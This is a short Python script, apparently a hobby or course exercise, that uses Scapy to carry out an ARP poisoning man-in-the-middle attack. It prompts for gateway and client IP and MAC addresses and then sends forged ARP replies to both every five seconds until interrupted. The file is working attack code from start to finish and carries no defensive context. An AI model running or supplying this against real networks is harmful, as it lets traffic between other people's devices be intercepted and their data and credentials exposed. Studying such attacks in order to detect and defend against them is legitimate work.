 
#initial imports
import socket
import os
from scapy.all import *

#definition to send messages
def spoofServer(gateway_ip, gateway_mac, client_ip):
	send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=client_ip))

def spoofClient(client_ip, client_mac, gateway_ip):
	send(ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=gateway_ip))
    

#Get user input
os.system('ip neigh');

gateway_ip = input("Please enter the IP address of the gateway: ")

gateway_mac = input("Please enter the MAC address of the gateway: ")

client_ip = input("Please enter the IP address of the client: ")

client_mac = input("Please enter the MAC address of the client: ")

host_ip = input("Please enter the IP address of the host: ")

host_port = input("Please enter the port you wish to use (If not ran as super user, port must be higher than 1024): ")

   	
#Create socket

print("\nThis program will continue to send spoofed ARP messages until stopped. \nPress Ctrl+C to stop at anytime.\n")
HOST = host_ip                 
PORT = int(host_port)             
host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host.bind((HOST, PORT))
arpCheck = 0;


#Continuously send messages 
try:
	while True:
		spoofServer(gateway_ip, gateway_mac, client_ip)
		spoofClient(client_ip, client_mac, gateway_ip)			
		time.sleep(5)
		

except KeyboardInterrupt:
	print("\nARP Poisoning concluded")

host.close()
